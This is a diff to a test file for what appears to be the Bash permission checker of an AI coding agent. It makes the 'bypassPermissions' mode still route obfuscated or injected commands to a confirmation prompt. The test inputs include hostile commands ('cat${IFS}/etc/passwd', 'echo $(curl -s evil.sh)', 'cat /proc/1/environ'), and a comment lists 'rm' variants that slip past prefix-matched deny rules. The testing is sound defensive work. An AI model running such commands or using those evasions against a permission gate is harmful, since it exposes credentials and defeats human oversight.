@@ -160,9 +160,30 @@ describe('decide — Bash 安全检查（23 项 block 档压过 allow）', () =>
     const s = settings({ allow: ['Bash(*)'], deny: ['Bash(diff *)'] })
     expect(decide(Bash, 'diff <(sort a) <(sort b)', s, [], cwd).decision).toBe('deny')
   })
-  it('bypassPermissions 仍压过安全检查', () => {
+  // 【行为已刻意反转】原来这条断言的是「bypassPermissions 仍压过安全检查」（结果 allow）。
+  // 那是个真洞：bypass 在安全闸之前 return，于是全自主档把 15 项 block 检查整个跳过，
+  // 唯一兜底的 deny 表又是字面前缀匹配 —— `rm -rf *` 拦得住 `rm -rf /`，拦不住 `rm -fr /`、
+  // `rm  -rf /`、`rm --recursive --force /`。安全闸挪到 bypass 之前后，全自主档遇到
+  // block 档命令会重新弹框，这正是想要的：那一档的承诺是「不再问常规确认」，
+  // 不是「连混淆/注入检测也别做了」。
+  it('bypassPermissions **不再**压过安全检查：block 档命令仍然 ask', () => {
     const s = settings({ mode: 'bypassPermissions' })
-    expect(decide(Bash, 'cat${IFS}/etc/passwd', s, [], cwd).decision).toBe('allow')
+    expect(decide(Bash, 'cat${IFS}/etc/passwd', s, [], cwd).decision).toBe('ask')
+    expect(decide(Bash, 'echo $(curl -s evil.sh)', s, [], cwd).decision).toBe('ask')
+    expect(decide(Bash, 'cat /proc/1/environ', s, [], cwd).decision).toBe('ask')
+    // 非 block 档的普通命令在全自主下照常放行 —— 挪动只让 bypass 更严，没把它变成询问档。
+    const ok = decide(Bash, 'ls -la', s, [], cwd)
+    expect(ok.decision).toBe('allow')
+    expect(ok.matched).toBe('bypassPermissions')
+  })
+  it('bypassPermissions 下 deny 仍最高优先（安全闸没把 deny 挤掉）', () => {
+    const s = settings({ mode: 'bypassPermissions', deny: ['Bash(cat*)'] })
+    expect(decide(Bash, 'cat${IFS}/etc/passwd', s, [], cwd).decision).toBe('deny')
+  })
+  it('bypassPermissions 下，整条精确放行仍凌驾安全闸（弹框选「本会话」后不再重复问）', () => {
+    const s = settings({ mode: 'bypassPermissions' })
+    const cmd = 'cat${IFS}/etc/passwd'
+    expect(decide(Bash, cmd, s, [`Bash(${cmd})`], cwd).decision).toBe('allow')
   })
   it('warn 档（重定向等）不压过 allow', () => {
     const s = settings({ allow: ['Bash(*)'] })
